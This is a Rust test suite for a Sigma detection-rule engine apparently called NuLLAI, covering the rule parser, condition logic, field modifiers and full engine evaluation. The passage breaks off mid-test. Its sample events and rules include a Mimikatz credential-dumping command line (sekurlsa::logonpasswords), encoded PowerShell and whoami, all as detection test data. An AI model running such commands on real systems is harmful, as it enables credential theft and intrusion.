// =============================================================================
// NuLLAI Sigma Rule Engine — Comprehensive Tests
// =============================================================================
// Every modifier, every condition pattern, every edge case. Adversaries don't
// attack the obvious paths — they probe edge cases. Every untested path is an
// open door.
// =============================================================================

#[cfg(test)]
mod tests {
    use null_sigma::*;
    use std::collections::HashMap;

    // ═════════════════════════════════════════════════════════════════════
    // PARSER TESTS — YAML → SigmaRule
    // ═════════════════════════════════════════════════════════════════════

    mod parser_tests {
        use super::*;

        #[test]
        fn parse_minimal_valid_rule() {
            let yaml = r#"
title: Test Rule
logsource:
    category: test
detection:
    selection:
        field: value
    condition: selection
"#;
            let (rule, identifiers) = parse_rule(yaml).unwrap();
            assert_eq!(rule.title, "Test Rule");
            assert_eq!(identifiers.len(), 1);
            assert_eq!(identifiers[0].name, "selection");
        }

        #[test]
        fn parse_full_rule_all_fields() {
            let yaml = r#"
title: Full Test Rule
id: 12345678-1234-1234-1234-123456789abc
status: stable
level: high
description: A full test rule with all fields
author: NuLLAI
date: 2026/03/15
references:
    - https://example.com
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
    service: sysmon
detection:
    selection:
        CommandLine|contains: '-enc'
    condition: selection
falsepositives:
    - Legitimate admin PowerShell usage
"#;
            let (rule, _) = parse_rule(yaml).unwrap();
            assert_eq!(rule.id, "12345678-1234-1234-1234-123456789abc");
            assert_eq!(rule.status, RuleStatus::Stable);
            assert_eq!(rule.level, SeverityLevel::High);
            assert_eq!(rule.author, "NuLLAI");
            assert_eq!(rule.tags.len(), 2);
            assert!(rule.tags.contains(&"attack.execution".to_string()));
            assert_eq!(rule.falsepositives.len(), 1);
            assert_eq!(rule.logsource.category, Some("process_creation".to_string()));
            assert_eq!(rule.logsource.product, Some("windows".to_string()));
            assert_eq!(rule.logsource.service, Some("sysmon".to_string()));
        }

        #[test]
        fn parse_auto_generates_id() {
            let yaml = r#"
title: No ID Rule
logsource:
    category: test
detection:
    selection:
        field: value
    condition: selection
"#;
            let (rule, _) = parse_rule(yaml).unwrap();
            assert!(!rule.id.is_empty());
            // Same title should generate same ID (deterministic)
            let (rule2, _) = parse_rule(yaml).unwrap();
            assert_eq!(rule.id, rule2.id);
        }

        #[test]
        fn parse_multiple_search_identifiers() {
            let yaml = r#"
title: Multi Identifier Rule
logsource:
    category: test
detection:
    selection:
        CommandLine|contains: '-enc'
    filter:
        User: 'SYSTEM'
    condition: selection and not filter
"#;
            let (_, identifiers) = parse_rule(yaml).unwrap();
            assert_eq!(identifiers.len(), 2);
            let names: Vec<&str> = identifiers.iter().map(|i| i.name.as_str()).collect();
            assert!(names.contains(&"selection"));
            assert!(names.contains(&"filter"));
        }

        #[test]
        fn parse_list_of_values_keyword_search() {
            // When detection uses a list of bare strings, it becomes a keyword search
            let yaml = r#"
title: Keyword Search Rule
logsource:
    category: test
detection:
    keywords:
        - 'suspicious'
        - 'malware'
        - 'hack'
    condition: keywords
"#;
            let (_, identifiers) = parse_rule(yaml).unwrap();
            assert_eq!(identifiers.len(), 1);
            let kw = &identifiers[0];
            assert_eq!(kw.name, "keywords");
            // Keywords should have empty field names (match any field)
            assert!(kw.groups.iter().all(|g| g.conditions.iter().all(|c| c.field.is_empty())));
        }

        #[test]
        fn parse_list_of_maps_or_groups() {
            // A list of maps creates OR-ed groups
            let yaml = r#"
title: List of Maps Rule
logsource:
    category: test
detection:
    selection:
        - CommandLine|contains: 'powershell'
          User: 'admin'
        - CommandLine|contains: 'cmd'
          User: 'SYSTEM'
    condition: selection
"#;
            let (_, identifiers) = parse_rule(yaml).unwrap();
            let sel = &identifiers[0];
            // Should have 2 OR-ed groups
            assert_eq!(sel.groups.len(), 2);
            // Each group should have 2 AND-ed conditions
            assert_eq!(sel.groups[0].conditions.len(), 2);
            assert_eq!(sel.groups[1].conditions.len(), 2);
        }

        #[test]
        fn parse_multiple_values_per_field() {
            let yaml = r#"
title: Multiple Values Rule
logsource:
    category: test
detection:
    selection:
        CommandLine|contains:
            - '-enc'
            - '-encodedcommand'
            - '-ec'
    condition: selection
"#;
            let (_, identifiers) = parse_rule(yaml).unwrap();
            let sel = &identifiers[0];
            assert_eq!(sel.groups[0].conditions.len(), 1);
            // Should have 3 values (OR-ed)
            assert_eq!(sel.groups[0].conditions[0].values.len(), 3);
        }

        #[test]
        fn parse_modifiers_complex() {
            let yaml = r#"
title: Complex Modifiers
logsource:
    category: test
detection:
    selection:
        CommandLine|contains|all:
            - '-enc'
            - 'powershell'
    condition: selection
"#;
            let (_, identifiers) = parse_rule(yaml).unwrap();
            let cond = &identifiers[0].groups[0].conditions[0];
            assert!(cond.modifiers.contains(&ValueModifier::Contains));
            assert!(cond.modifiers.contains(&ValueModifier::All));
        }

        #[test]
        fn parse_multi_document_yaml() {
            let yaml = r#"
title: Rule 1
logsource:
    category: test
detection:
    selection:
        field: value1
    condition: selection
---
title: Rule 2
logsource:
    category: test
detection:
    selection:
        field: value2
    condition: selection
"#;
            let results = parse_rules(yaml);
            assert_eq!(results.len(), 2);
            assert!(results.iter().all(|r| r.is_ok()));
        }

        #[test]
        fn parse_severity_levels() {
            for (level_str, expected) in [
                ("informational", SeverityLevel::Informational),
                ("low", SeverityLevel::Low),
                ("medium", SeverityLevel::Medium),
                ("high", SeverityLevel::High),
                ("critical", SeverityLevel::Critical),
            ] {
                let yaml = format!(
                    "title: Test\nlevel: {}\nlogsource:\n    category: test\ndetection:\n    sel:\n        f: v\n    condition: sel\n",
                    level_str
                );
                let (rule, _) = parse_rule(&yaml).unwrap();
                assert_eq!(rule.level, expected, "Failed for level: {level_str}");
            }
        }

        #[test]
        fn parse_rule_statuses() {
            let cases = [
                ("experimental", RuleStatus::Experimental),
                ("test", RuleStatus::Test),
                ("stable", RuleStatus::Stable),
                ("deprecated", RuleStatus::Deprecated),
                ("unsupported", RuleStatus::Unsupported),
            ];
            for (status_str, expected) in cases {
                let yaml = format!(
                    "title: Test\nstatus: {}\nlogsource:\n    category: test\ndetection:\n    sel:\n        f: v\n    condition: sel\n",
                    status_str
                );
                let (rule, _) = parse_rule(&yaml).unwrap();
                assert_eq!(rule.status, expected, "Failed for status: {status_str}");
            }
        }

        #[test]
        fn parse_error_missing_title() {
            let yaml = r#"
logsource:
    category: test
detection:
    selection:
        field: value
    condition: selection
"#;
            let result = parse_rule(yaml);
            assert!(result.is_err());
        }

        #[test]
        fn parse_error_missing_detection() {
            let yaml = r#"
title: No Detection
logsource:
    category: test
"#;
            let result = parse_rule(yaml);
            assert!(result.is_err());
        }

        #[test]
        fn parse_numeric_and_boolean_values() {
            let yaml = r#"
title: Typed Values
logsource:
    category: test
detection:
    selection:
        count|gte: 10
        enabled: true
    condition: selection
"#;
            let (_, identifiers) = parse_rule(yaml).unwrap();
            let group = &identifiers[0].groups[0];
            // Should handle integer and boolean values
            assert!(!group.conditions.is_empty());
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // CONDITION COMPILER TESTS — String → AST
    // ═════════════════════════════════════════════════════════════════════

    mod condition_tests {
        use super::*;

        fn make_identifiers(names: &[&str]) -> Vec<SearchIdentifier> {
            names.iter().map(|n| SearchIdentifier {
                name: n.to_string(),
                groups: vec![],
            }).collect()
        }

        #[test]
        fn compile_simple_identifier() {
            let ids = make_identifiers(&["selection"]);
            let node = compile_condition("selection", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("selection".to_string(), true);
            assert!(node.evaluate(&results));

            results.insert("selection".to_string(), false);
            assert!(!node.evaluate(&results));
        }

        #[test]
        fn compile_and() {
            let ids = make_identifiers(&["sel1", "sel2"]);
            let node = compile_condition("sel1 and sel2", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("sel1".to_string(), true);
            results.insert("sel2".to_string(), true);
            assert!(node.evaluate(&results));

            results.insert("sel2".to_string(), false);
            assert!(!node.evaluate(&results));
        }

        #[test]
        fn compile_or() {
            let ids = make_identifiers(&["sel1", "sel2"]);
            let node = compile_condition("sel1 or sel2", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("sel1".to_string(), false);
            results.insert("sel2".to_string(), true);
            assert!(node.evaluate(&results));

            results.insert("sel2".to_string(), false);
            assert!(!node.evaluate(&results));
        }

        #[test]
        fn compile_not() {
            let ids = make_identifiers(&["filter"]);
            let node = compile_condition("not filter", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("filter".to_string(), false);
            assert!(node.evaluate(&results));

            results.insert("filter".to_string(), true);
            assert!(!node.evaluate(&results));
        }

        #[test]
        fn compile_selection_and_not_filter() {
            // Most common Sigma pattern
            let ids = make_identifiers(&["selection", "filter"]);
            let node = compile_condition("selection and not filter", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("selection".to_string(), true);
            results.insert("filter".to_string(), false);
            assert!(node.evaluate(&results));

            results.insert("filter".to_string(), true);
            assert!(!node.evaluate(&results));
        }

        #[test]
        fn compile_parenthesized_or_and_not() {
            let ids = make_identifiers(&["sel_a", "sel_b", "filter"]);
            let node = compile_condition(
                "(sel_a or sel_b) and not filter", &ids
            ).unwrap();

            let mut results = HashMap::new();
            results.insert("sel_a".to_string(), false);
            results.insert("sel_b".to_string(), true);
            results.insert("filter".to_string(), false);
            assert!(node.evaluate(&results));

            results.insert("sel_b".to_string(), false);
            assert!(!node.evaluate(&results));
        }

        #[test]
        fn compile_nested_parens() {
            let ids = make_identifiers(&["a", "b", "c", "d"]);
            let node = compile_condition("(a and b) or (c and d)", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("a".to_string(), true);
            results.insert("b".to_string(), true);
            results.insert("c".to_string(), false);
            results.insert("d".to_string(), false);
            assert!(node.evaluate(&results));

            results.insert("a".to_string(), false);
            results.insert("c".to_string(), true);
            results.insert("d".to_string(), true);
            assert!(node.evaluate(&results));
        }

        #[test]
        fn compile_1_of_them() {
            let ids = make_identifiers(&["sel1", "sel2", "sel3"]);
            let node = compile_condition("1 of them", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("sel1".to_string(), false);
            results.insert("sel2".to_string(), true);
            results.insert("sel3".to_string(), false);
            assert!(node.evaluate(&results));

            results.insert("sel2".to_string(), false);
            assert!(!node.evaluate(&results));
        }

        #[test]
        fn compile_all_of_them() {
            let ids = make_identifiers(&["sel1", "sel2"]);
            let node = compile_condition("all of them", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("sel1".to_string(), true);
            results.insert("sel2".to_string(), true);
            assert!(node.evaluate(&results));

            results.insert("sel2".to_string(), false);
            assert!(!node.evaluate(&results));
        }

        #[test]
        fn compile_1_of_wildcard_pattern() {
            let ids = make_identifiers(&["selection_proc", "selection_cmd", "filter"]);
            let node = compile_condition("1 of selection*", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("selection_proc".to_string(), false);
            results.insert("selection_cmd".to_string(), true);
            results.insert("filter".to_string(), false);
            assert!(node.evaluate(&results));
        }

        #[test]
        fn compile_all_of_wildcard() {
            let ids = make_identifiers(&["sel_a", "sel_b", "filter"]);
            let node = compile_condition("all of sel*", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("sel_a".to_string(), true);
            results.insert("sel_b".to_string(), true);
            results.insert("filter".to_string(), false);
            assert!(node.evaluate(&results));

            results.insert("sel_b".to_string(), false);
            assert!(!node.evaluate(&results));
        }

        #[test]
        fn compile_complex_condition_with_quantifier() {
            let ids = make_identifiers(&["selection_1", "selection_2", "filter"]);
            let node = compile_condition(
                "1 of selection* and not filter", &ids
            ).unwrap();

            let mut results = HashMap::new();
            results.insert("selection_1".to_string(), true);
            results.insert("selection_2".to_string(), false);
            results.insert("filter".to_string(), false);
            assert!(node.evaluate(&results));
        }

        #[test]
        fn compile_empty_condition_error() {
            let ids = make_identifiers(&["sel"]);
            let result = compile_condition("", &ids);
            assert!(result.is_err());
        }

        #[test]
        fn compile_operator_precedence() {
            // NOT > AND > OR
            let ids = make_identifiers(&["a", "b", "c"]);
            // "a or b and c" should be "a or (b and c)"
            let node = compile_condition("a or b and c", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("a".to_string(), true);
            results.insert("b".to_string(), false);
            results.insert("c".to_string(), false);
            // a=true, so "a or (false and false)" = true
            assert!(node.evaluate(&results));

            results.insert("a".to_string(), false);
            results.insert("b".to_string(), true);
            results.insert("c".to_string(), true);
            // "false or (true and true)" = true
            assert!(node.evaluate(&results));

            results.insert("c".to_string(), false);
            // "false or (true and false)" = false
            assert!(!node.evaluate(&results));
        }

        #[test]
        fn compile_double_not() {
            let ids = make_identifiers(&["sel"]);
            let node = compile_condition("not not sel", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("sel".to_string(), true);
            assert!(node.evaluate(&results));
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // MATCHER TESTS — Event matching with all modifiers
    // ═════════════════════════════════════════════════════════════════════

    mod matcher_tests {
        use super::*;

        fn make_event(pairs: &[(&str, &str)]) -> HashMap<String, String> {
            pairs.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect()
        }

        fn make_condition(field: &str, values: &[&str], mods: &[ValueModifier]) -> FieldCondition {
            FieldCondition {
                field: field.to_string(),
                values: values.iter().map(|v| SigmaValue::String(v.to_string())).collect(),
                modifiers: mods.to_vec(),
            }
        }

        fn make_identifier(name: &str, conditions: Vec<FieldCondition>) -> SearchIdentifier {
            SearchIdentifier {
                name: name.to_string(),
                groups: vec![FieldConditionGroup { conditions }],
            }
        }

        // ─── Default (exact) matching ───────────────────────────────────

        #[test]
        fn exact_match_case_insensitive() {
            let event = make_event(&[("field", "PowerShell")]);
            let cond = make_condition("field", &["powershell"], &[]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn exact_match_no_match() {
            let event = make_event(&[("field", "cmd.exe")]);
            let cond = make_condition("field", &["powershell"], &[]);
            assert!(!match_field_condition(&cond, &event));
        }

        #[test]
        fn exact_match_with_wildcard() {
            let event = make_event(&[("image", "C:\\Windows\\System32\\cmd.exe")]);
            let cond = make_condition("image", &["*\\cmd.exe"], &[]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn exact_match_wildcard_question_mark() {
            let event = make_event(&[("field", "test1")]);
            let cond = make_condition("field", &["test?"], &[]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn exact_match_multiple_values_or() {
            let event = make_event(&[("field", "cmd")]);
            let cond = make_condition("field", &["powershell", "cmd", "bash"], &[]);
            assert!(match_field_condition(&cond, &event));
        }

        // ─── Contains modifier ──────────────────────────────────────────

        #[test]
        fn contains_modifier() {
            let event = make_event(&[("cmd", "powershell -encodedcommand AAAA")]);
            let cond = make_condition("cmd", &["-encodedcommand"], &[ValueModifier::Contains]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn contains_modifier_no_match() {
            let event = make_event(&[("cmd", "notepad.exe")]);
            let cond = make_condition("cmd", &["powershell"], &[ValueModifier::Contains]);
            assert!(!match_field_condition(&cond, &event));
        }

        #[test]
        fn contains_case_insensitive() {
            let event = make_event(&[("cmd", "PowerShell -EncodedCommand")]);
            let cond = make_condition("cmd", &["-encodedcommand"], &[ValueModifier::Contains]);
            assert!(match_field_condition(&cond, &event));
        }

        // ─── Contains|all modifier ──────────────────────────────────────

        #[test]
        fn contains_all_modifier() {
            let event = make_event(&[("cmd", "powershell -enc -nop -sta")]);
            let cond = make_condition(
                "cmd", &["-enc", "-nop"],
                &[ValueModifier::Contains, ValueModifier::All],
            );
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn contains_all_modifier_partial_match() {
            let event = make_event(&[("cmd", "powershell -enc something")]);
            let cond = make_condition(
                "cmd", &["-enc", "-nop"],
                &[ValueModifier::Contains, ValueModifier::All],
            );
            assert!(!match_field_condition(&cond, &event));
        }

        // ─── StartsWith modifier ────────────────────────────────────────

        #[test]
        fn startswith_modifier() {
            let event = make_event(&[("path", "C:\\Windows\\System32\\evil.exe")]);
            let cond = make_condition("path", &["C:\\Windows"], &[ValueModifier::StartsWith]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn startswith_no_match() {
            let event = make_event(&[("path", "D:\\App\\something.exe")]);
            let cond = make_condition("path", &["C:\\Windows"], &[ValueModifier::StartsWith]);
            assert!(!match_field_condition(&cond, &event));
        }

        // ─── EndsWith modifier ──────────────────────────────────────────

        #[test]
        fn endswith_modifier() {
            let event = make_event(&[("image", "C:\\Windows\\System32\\powershell.exe")]);
            let cond = make_condition("image", &["\\powershell.exe"], &[ValueModifier::EndsWith]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn endswith_no_match() {
            let event = make_event(&[("image", "C:\\App\\notepad.exe")]);
            let cond = make_condition("image", &["\\powershell.exe"], &[ValueModifier::EndsWith]);
            assert!(!match_field_condition(&cond, &event));
        }

        // ─── Regex modifier ────────────────────────────────────────────

        #[test]
        fn regex_modifier() {
            let event = make_event(&[("cmd", "cmd /c echo test123")]);
            let cond = make_condition("cmd", &["test\\d+"], &[ValueModifier::Regex]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn regex_case_insensitive_default() {
            let event = make_event(&[("cmd", "PowerShell -Version 2")]);
            let cond = make_condition("cmd", &["powershell.*version"], &[ValueModifier::Regex]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn regex_no_match() {
            let event = make_event(&[("cmd", "notepad.exe")]);
            let cond = make_condition("cmd", &["powershell\\s+-enc"], &[ValueModifier::Regex]);
            assert!(!match_field_condition(&cond, &event));
        }

        #[test]
        fn regex_invalid_pattern_no_crash() {
            let event = make_event(&[("cmd", "test")]);
            let cond = make_condition("cmd", &["[invalid"], &[ValueModifier::Regex]);
            assert!(!match_field_condition(&cond, &event));
        }

        // ─── CIDR modifier ─────────────────────────────────────────────

        #[test]
        fn cidr_match_ipv4() {
            let event = make_event(&[("src_ip", "192.168.1.50")]);
            let cond = make_condition("src_ip", &["192.168.1.0/24"], &[ValueModifier::Cidr]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn cidr_no_match_ipv4() {
            let event = make_event(&[("src_ip", "10.0.0.1")]);
            let cond = make_condition("src_ip", &["192.168.1.0/24"], &[ValueModifier::Cidr]);
            assert!(!match_field_condition(&cond, &event));
        }

        #[test]
        fn cidr_match_ipv6() {
            let event = make_event(&[("src_ip", "2001:db8::1")]);
            let cond = make_condition("src_ip", &["2001:db8::/32"], &[ValueModifier::Cidr]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn cidr_invalid_no_crash() {
            let event = make_event(&[("src_ip", "not_an_ip")]);
            let cond = make_condition("src_ip", &["192.168.1.0/24"], &[ValueModifier::Cidr]);
            assert!(!match_field_condition(&cond, &event));
        }

        // ─── Numeric comparison modifiers ───────────────────────────────

        #[test]
        fn gt_modifier() {
            let event = make_event(&[("score", "85")]);
            let cond = FieldCondition {
                field: "score".to_string(),
                values: vec![SigmaValue::Integer(80)],
                modifiers: vec![ValueModifier::Gt],
            };
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn gt_modifier_equal_no_match() {
            let event = make_event(&[("score", "80")]);
            let cond = FieldCondition {
                field: "score".to_string(),
                values: vec![SigmaValue::Integer(80)],
                modifiers: vec![ValueModifier::Gt],
            };
            assert!(!match_field_condition(&cond, &event));
        }

        #[test]
        fn gte_modifier() {
            let event = make_event(&[("score", "80")]);
            let cond = FieldCondition {
                field: "score".to_string(),
                values: vec![SigmaValue::Integer(80)],
                modifiers: vec![ValueModifier::Gte],
            };
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn lt_modifier() {
            let event = make_event(&[("score", "5")]);
            let cond = FieldCondition {
                field: "score".to_string(),
                values: vec![SigmaValue::Integer(10)],
                modifiers: vec![ValueModifier::Lt],
            };
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn lte_modifier() {
            let event = make_event(&[("score", "10")]);
            let cond = FieldCondition {
                field: "score".to_string(),
                values: vec![SigmaValue::Integer(10)],
                modifiers: vec![ValueModifier::Lte],
            };
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn numeric_non_numeric_field_no_match() {
            let event = make_event(&[("score", "not_a_number")]);
            let cond = FieldCondition {
                field: "score".to_string(),
                values: vec![SigmaValue::Integer(10)],
                modifiers: vec![ValueModifier::Gt],
            };
            assert!(!match_field_condition(&cond, &event));
        }

        // ─── Exists modifier ───────────────────────────────────────────

        #[test]
        fn exists_true_field_present() {
            let event = make_event(&[("cmd", "something")]);
            let cond = FieldCondition {
                field: "cmd".to_string(),
                values: vec![SigmaValue::Boolean(true)],
                modifiers: vec![ValueModifier::Exists],
            };
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn exists_true_field_absent() {
            let event = make_event(&[("other", "something")]);
            let cond = FieldCondition {
                field: "cmd".to_string(),
                values: vec![SigmaValue::Boolean(true)],
                modifiers: vec![ValueModifier::Exists],
            };
            assert!(!match_field_condition(&cond, &event));
        }

        #[test]
        fn exists_false_field_absent() {
            let event = make_event(&[("other", "something")]);
            let cond = FieldCondition {
                field: "cmd".to_string(),
                values: vec![SigmaValue::Boolean(false)],
                modifiers: vec![ValueModifier::Exists],
            };
            assert!(match_field_condition(&cond, &event));
        }

        // ─── Windash modifier ──────────────────────────────────────────

        #[test]
        fn windash_modifier() {
            let event = make_event(&[("cmd", "cmd /c whoami")]);
            // Rule uses `-c` but windash adds `/c` variant
            let cond = make_condition("cmd", &["-c"], &[ValueModifier::Windash, ValueModifier::Contains]);
            assert!(match_field_condition(&cond, &event));
        }

        // ─── Keyword search (empty field) ──────────────────────────────

        #[test]
        fn keyword_search_matches_any_field() {
            let event = make_event(&[
                ("field1", "normal value"),
                ("field2", "suspicious command here"),
            ]);
            let cond = make_condition("", &["suspicious"], &[ValueModifier::Contains]);
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn keyword_search_no_match() {
            let event = make_event(&[
                ("field1", "normal value"),
                ("field2", "another normal"),
            ]);
            let cond = make_condition("", &["suspicious"], &[ValueModifier::Contains]);
            assert!(!match_field_condition(&cond, &event));
        }

        // ─── Null value matching ───────────────────────────────────────

        #[test]
        fn null_matches_empty_field() {
            let event = make_event(&[("field", "")]);
            let cond = FieldCondition {
                field: "field".to_string(),
                values: vec![SigmaValue::Null],
                modifiers: vec![],
            };
            assert!(match_field_condition(&cond, &event));
        }

        #[test]
        fn null_no_match_nonempty() {
            let event = make_event(&[("field", "something")]);
            let cond = FieldCondition {
                field: "field".to_string(),
                values: vec![SigmaValue::Null],
                modifiers: vec![],
            };
            assert!(!match_field_condition(&cond, &event));
        }

        // ─── Field case insensitivity ──────────────────────────────────

        #[test]
        fn field_name_case_insensitive() {
            let event = make_event(&[("CommandLine", "powershell.exe -enc")]);
            let cond = make_condition("commandline", &["-enc"], &[ValueModifier::Contains]);
            assert!(match_field_condition(&cond, &event));
        }

        // ─── Identifier AND/OR logic ───────────────────────────────────

        #[test]
        fn identifier_and_logic_across_conditions() {
            let event = make_event(&[
                ("cmd", "powershell -enc AAAA"),
                ("user", "admin"),
            ]);
            let id = make_identifier("sel", vec![
                make_condition("cmd", &["-enc"], &[ValueModifier::Contains]),
                make_condition("user", &["admin"], &[]),
            ]);
            // Both conditions must match (AND within group)
            assert!(match_identifier(&id, &event));
        }

        #[test]
        fn identifier_or_across_groups() {
            let event = make_event(&[("cmd", "calc.exe"), ("user", "admin")]);
            let id = SearchIdentifier {
                name: "sel".to_string(),
                groups: vec![
                    FieldConditionGroup {
                        conditions: vec![make_condition("cmd", &["powershell"], &[])],
                    },
                    FieldConditionGroup {
                        conditions: vec![make_condition("user", &["admin"], &[])],
                    },
                ],
            };
            // First group fails, second matches — OR across groups
            assert!(match_identifier(&id, &event));
        }

        // ─── Missing field ─────────────────────────────────────────────

        #[test]
        fn missing_field_no_match() {
            let event = make_event(&[("other_field", "value")]);
            let cond = make_condition("nonexistent", &["value"], &[]);
            assert!(!match_field_condition(&cond, &event));
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // FIELD MAPPING TESTS
    // ═════════════════════════════════════════════════════════════════════

    mod fieldmap_tests {
        use super::*;

        #[test]
        fn default_mapping_sysmon_fields() {
            let fm = FieldMapping::new();
            assert_eq!(fm.translate("CommandLine"), "command_line");
            assert_eq!(fm.translate("Image"), "image");
            assert_eq!(fm.translate("ParentImage"), "parent_image");
            assert_eq!(fm.translate("TargetFilename"), "target_filename");
            assert_eq!(fm.translate("DestinationIp"), "destination_ip");
        }

        #[test]
        fn mapping_case_insensitive() {
            let fm = FieldMapping::new();
            assert_eq!(fm.translate("commandline"), "command_line");
            assert_eq!(fm.translate("COMMANDLINE"), "command_line");
        }

        #[test]
        fn unmapped_passthrough() {
            let fm = FieldMapping::new();
            assert_eq!(fm.translate("custom_field"), "custom_field");
        }

        #[test]
        fn custom_mapping() {
            let mut fm = FieldMapping::new();
            fm.add_mapping("MyCustomField", "my_custom_field");
            assert_eq!(fm.translate("MyCustomField"), "my_custom_field");
        }

        #[test]
        fn enrich_event_adds_sigma_names() {
            let fm = FieldMapping::new();
            let mut event = HashMap::new();
            event.insert("command_line".to_string(), "powershell.exe".to_string());
            let enriched = fm.enrich_event(&event);
            // Should have both the original and the Sigma-canonical name
            assert_eq!(enriched.get("command_line").unwrap(), "powershell.exe");
            assert_eq!(enriched.get("commandline").unwrap(), "powershell.exe");
        }

        #[test]
        fn mapping_count() {
            let fm = FieldMapping::new();
            assert!(fm.len() > 50, "Should have 50+ default field mappings");
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // ENGINE INTEGRATION TESTS — Full rule evaluation
    // ═════════════════════════════════════════════════════════════════════

    mod engine_tests {
        use super::*;

        fn process_event(cmd: &str, image: &str) -> HashMap<String, String> {
            let mut event = HashMap::new();
            event.insert("command_line".to_string(), cmd.to_string());
            event.insert("image".to_string(), image.to_string());
            event.insert("event_category".to_string(), "process_creation".to_string());
            event.insert("event_product".to_string(), "windows".to_string());
            event
        }

        #[test]
        fn engine_load_and_evaluate_single_rule() {
            let yaml = r#"
title: Encoded PowerShell
level: high
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains:
            - '-enc'
            - '-encodedcommand'
        Image|endswith: '\powershell.exe'
    condition: selection
"#;

            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();
            assert_eq!(engine.rule_count(), 1);

            let event = process_event(
                "powershell.exe -enc SQBFAFgA",
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            );
            let matches = engine.evaluate_event(&event);
            assert_eq!(matches.len(), 1);
            assert_eq!(matches[0].rule_title, "Encoded PowerShell");
            assert_eq!(matches[0].rule_level, SeverityLevel::High);
            assert!(matches[0].score > 0.0);
        }

        #[test]
        fn engine_no_match_benign_event() {
            let yaml = r#"
title: Suspicious PowerShell
level: high
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains: '-enc'
    condition: selection
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            let event = process_event("notepad.exe README.txt", "C:\\Windows\\notepad.exe");
            let matches = engine.evaluate_event(&event);
            assert!(matches.is_empty());
        }

        #[test]
        fn engine_selection_and_not_filter() {
            let yaml = r#"
title: Suspicious Process Creation
level: medium
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains: 'whoami'
    filter:
        Image|endswith: '\cmd.exe'
    condition: selection and not filter
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            // Should match: whoami via powershell (not filtered)
            let event1 = process_event(
                "powershell -c whoami",
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            );
            assert_eq!(engine.evaluate_event(&event1).len(), 1);

            // Should NOT match: whoami via cmd.exe (filtered out)
            let event2 = process_event(
                "whoami /priv",
                "C:\\Windows\\System32\\cmd.exe",
            );
            assert!(engine.evaluate_event(&event2).is_empty());
        }

        #[test]
        fn engine_logsource_filtering() {
            let yaml = r#"
title: Windows Only Rule
level: medium
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains: 'test'
    condition: selection
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            // Should match: correct logsource
            let mut event1 = HashMap::new();
            event1.insert("command_line".to_string(), "test command".to_string());
            event1.insert("event_category".to_string(), "process_creation".to_string());
            event1.insert("event_product".to_string(), "windows".to_string());
            assert_eq!(engine.evaluate_event(&event1).len(), 1);

            // Should NOT match: wrong product
            let mut event2 = HashMap::new();
            event2.insert("command_line".to_string(), "test command".to_string());
            event2.insert("event_category".to_string(), "process_creation".to_string());
            event2.insert("event_product".to_string(), "linux".to_string());
            assert!(engine.evaluate_event(&event2).is_empty());
        }

        #[test]
        fn engine_multiple_rules() {
            let yaml1 = r#"
title: Rule A
level: high
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains: 'mimikatz'
    condition: selection
"#;
            let yaml2 = r#"
title: Rule B
level: medium
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains: 'whoami'
    condition: selection
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml1).unwrap();
            engine.load_rule(yaml2).unwrap();
            assert_eq!(engine.rule_count(), 2);

            // Event matches only Rule A
            let event = process_event("mimikatz.exe sekurlsa::logonpasswords", "C:\\temp\\mimikatz.exe");
            let matches = engine.evaluate_event(&event);
            assert_eq!(matches.len(), 1);
            assert_eq!(matches[0].rule_title, "Rule A");
        }

        #[test]
        fn engine_batch_evaluation() {
            let yaml = r#"
title: Batch Test Rule
level: medium
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains: 'suspicious'
    condition: selection
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

